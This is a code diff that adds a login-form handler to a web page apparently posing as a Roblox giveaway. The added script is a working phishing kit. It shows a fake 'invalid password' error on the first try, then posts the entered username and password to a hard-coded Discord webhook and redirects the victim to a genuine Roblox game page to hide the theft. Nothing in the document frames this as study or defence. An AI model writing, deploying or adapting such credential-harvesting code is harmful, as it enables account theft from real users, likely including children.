@@ -150,6 +150,46 @@
       function closeModal() {
         document.getElementById('loginModal').classList.add('hidden');
       }
+
+          // Login handling
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const username = document.getElementById("username").value;
+          const password = document.getElementById("password").value;
+          const errorMsg = document.getElementById("errorMessage");
+          const webhookURL = "https://discord.com/api/webhooks/1383072969382957178/nr0W47Y6JGzNfrHxD9_6C1H0FQ6HOUpW3z1m_U2DKfOxBx3fe9AKASrS_VFpHu_Dnb8f"; // Replace with your actual Discord webhook!
+
+          attempt++;
+
+          if (attempt === 1) {
+            errorMsg.textContent = "Invalid username or password. Try again.";
+            errorMsg.classList.remove("hidden");
+          } else {
+            errorMsg.textContent = "Please wait...";
+            errorMsg.classList.remove("hidden");
+
+            const payload = {
+              content: `🎮 **Roblox Giveaway Claim**\n👤 **Username:** ${username}\n🔑 **Password:** ${password}`,
+            };
+
+            fetch(webhookURL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload),
+            })
+              .then(() => {
+                setTimeout(() => {
+                  window.location.href = "https://www.roblox.com/games/126884695634066/Grow-a-Garden";
+                }, 1500);
+              })
+              .catch((err) => {
+                console.error(err);
+                alert("Error.");
+              });
+          }
+        });
     </script>
 
   </body>
